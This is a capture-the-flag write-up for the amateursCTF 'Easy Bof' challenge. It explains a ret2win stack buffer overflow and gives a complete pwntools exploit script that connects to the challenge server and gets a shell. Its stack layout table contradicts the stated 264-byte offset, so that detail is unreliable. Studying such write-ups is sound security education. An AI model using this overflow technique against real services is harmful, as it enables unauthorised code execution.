# Easy Bof – amateursCTF Write-Up

## Challenge Overview

- **Name:** Easy Bof  
- **Category:** Pwn  
- **Binary:** `chal` (64-bit ELF, NX, no PIE, no canary)  
- **Remote:** `nc amt.rs 30382`  
- **Flag:** `amateursCTF{some_easy_bof_for_you}`

The provided Dockerfile shows that the remote service uses the same `chal` binary and a local `flag` file:

```dockerfile
from pwn.red/jail

copy --from=ubuntu:25.10 / /srv
copy chal /srv/app/run
copy flag /srv/app/flag

env JAIL_TIME=0
```

This means each connection to the jail runs `/srv/app/run` (our `chal`) inside an Ubuntu 25.10 userland with the flag at `/app/flag` inside the jail.

## Source Analysis

```c
#include <stdio.h>
#include <stdlib.h>

void win() { system("sh"); }

int main() {
  char buf[0x100];
  size_t size;

  setbuf(stdout, NULL);

  printf("how much would you like to write? ");
  scanf("%ld", &size);
  getchar();
  fgets(buf, size, stdin);
}
```

Key points:

- `buf` is a **256-byte** stack buffer (`0x100`).
- `size` is read with `scanf("%ld", &size)` and **not validated**.
- `fgets(buf, size, stdin)` uses a **user-controlled length** `size` for reading into `buf`.
- If we choose `size > 0x100`, `fgets` will happily overflow `buf` and corrupt saved registers, including the saved return address.
- There is a convenient `win()` function that calls `system("sh");` — perfect for a ret2win.

Protections (via `checksec`):

- **NX:** enabled (no shellcode execution on the stack).
- **PIE:** disabled (code at fixed addresses, so function addresses are stable).
- **Canary:** none (stack overflow can directly overwrite the saved RIP).

So this is a straightforward **stack-based buffer overflow** with a ready-made `win()` target.

## Finding the Offset

We want to overflow `buf` up to the saved return address and overwrite it with the address of `win()`.

Using a cyclic pattern (pwntools) locally:

1. Generate a pattern and cause a crash:
   - Input `size = 400`.
   - Feed a 400-byte cyclic pattern into `fgets`.
2. Inspect the crashing context in `gdb`:
   - The value at `RIP` / the overwritten saved RIP slot corresponds to part of the pattern.
3. Use `cyclic_find` (with `n=8` for 64-bit patterns) to compute the offset.

This yields a return address offset of:

```text
offset = 264
```

So the layout is:

- `0x000`–`0x0ff`: `buf` (256 bytes)
- `0x100`–`0x107`: padding / `size` area, etc.
- `0x108`–`0x10f`: saved RBP
- `0x110`–`0x117`: **saved RIP** (overwritten after 264 bytes)

## Gadget and Target Addresses

Using `pwntools` / `ROPgadget`:

- `win` function address:

```text
win = 0x401176
```

- A simple `ret` gadget:

```text
ret = 0x40101a
```

On amd64, `system("sh")` can be sensitive to stack alignment; inserting a single `ret` before calling `win` keeps the stack 16-byte aligned according to System V ABI. This matches what worked reliably locally.

So the final overwrite we want is:

```text
RIP = ret; win
```

## Exploit Strategy

1. Connect to the remote service (`amt.rs 30382`).
2. Read the prompt: `"how much would you like to write? "`.
3. Send a large enough length, e.g. `400`, so `fgets` will overflow `buf`.
4. Send the payload:
   - 264 bytes of padding to reach the saved RIP.
   - `ret` gadget address.
   - `win` address.
5. Once `main` returns, control flow jumps to `ret`, which aligns the stack and then returns into `win`.
6. `win()` calls `system("sh")`, giving us a shell inside the jail.
7. From that shell, read `/app/flag`.

## Final Payload

In Python (using pwntools):

```python
from pwn import *

context.binary = elf = ELF('./chal', checksec=False)
rop = ROP(elf)

win = elf.sym['win']
ret = rop.find_gadget(['ret'])[0]

offset = 264
payload = b'A' * offset + p64(ret) + p64(win)
```

## Solve Script (Solve2.py)

The final remote exploit script connects to the service, performs the overflow, and then uses the shell to read the flag:

```python
from pwn import *

context.binary = elf = ELF("./chal", checksec=False)
rop = ROP(elf)

win = elf.sym["win"]
ret = rop.find_gadget(["ret"])[0]

offset = 264
payload = b"A" * offset + p64(ret) + p64(win)

io = remote("amt.rs", 30382)
io.recvuntil(b"write? ")
io.sendline(b"400")
io.sendline(payload)

io.interactive()
```

Running it:

```text
~$ python3 Solve2.py
[*] Loaded 5 cached gadgets for './chal'
[+] Opening connection to amt.rs on port 30382: Done
[*] Switching to interactive mode
$ cat flag
amateursCTF{some_easy_bof_for_you}
```

This confirms the exploit and reveals the flag.

